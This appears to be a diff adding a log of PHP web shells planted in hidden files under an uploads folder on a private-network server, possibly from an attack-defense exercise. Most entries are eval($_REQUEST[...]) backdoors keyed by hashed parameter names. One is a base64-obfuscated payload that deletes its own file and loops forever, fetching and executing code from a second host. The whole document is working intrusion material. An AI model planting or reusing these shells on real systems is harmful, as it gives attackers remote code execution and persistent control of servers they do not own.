@@ -1,0 +1,9 @@
+http://192.168.43.138/uploads/.CbmZVPlcpLzKTvmf.php => "<?php eval($_REQUEST['7f0f33be9ded6ed50b402e6434a52fff']);?>\r<?php phpinfo();?>                                        \n"
+http://192.168.43.138/uploads/.XXLsTZffqvRRrivF.php => "<?php eval($_REQUEST['35c295971525a983a3268cfa63753939']);?>\r<?php phpinfo();?>                                        \n"
+http://192.168.43.138/uploads/.LqJZZtjLPVIoWjHY.php => "<?php eval($_REQUEST['72a2bf016d5034cadae97e2cfba20d4a']);?>\r<?php phpinfo();?>                                        \n"
+http://192.168.43.138/uploads/.enNhjAibbxIZtgyS.php => '<?php eval($_REQUEST["67c9d7c74e9ec3dd48e56c18c75f349b"]);?>'
+http://192.168.43.138/uploads/.frkiqjKdzXvSYvyP.php => "<?php eval($_REQUEST['823f65a2da83929e772f68ce84b63135']);?>\r<?php phpinfo();?>                                          "
+http://192.168.43.138/uploads/.GCUeLZxgLmOLLmWS.php => "<?php eval($_REQUEST['e7ad2960307bfa38c37bac1a437469e6']);?>\r<?php phpinfo();?>                                          \n"
+http://192.168.43.138/uploads/.jcspaMBsqXvUfody.php => '<?php eval($_REQUEST["a2c27b7a3a6c590afcfc03934d33b9b2"]);?>'
+http://192.168.43.138/uploads/.sqRlDwaUYMRADIEi.php => '<?php eval(base64_decode("aWdub3JlX3VzZXJfYWJvcnQodHJ1ZSk7c2V0X3RpbWVfbGltaXQoMCk7dW5saW5rKF9fRklMRV9fKTt3aGlsZSh0cnVlKXskY29kZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdodHRwOi8vMTkyLjE2OC40My4xOTc6ODAvY29kZS50eHQnKTtldmFsKCRjb2RlKTtzbGVlcCg1KTt9"));unlink(__FILE__);?>'
+http://192.168.43.138/uploads/.DGKnIXMSjiTYvSWg.php => "<?php eval($_REQUEST['bef318ca9b4b94a9c8268a8f1093c158']);?>\r<?php phpinfo();?>                                          \n"
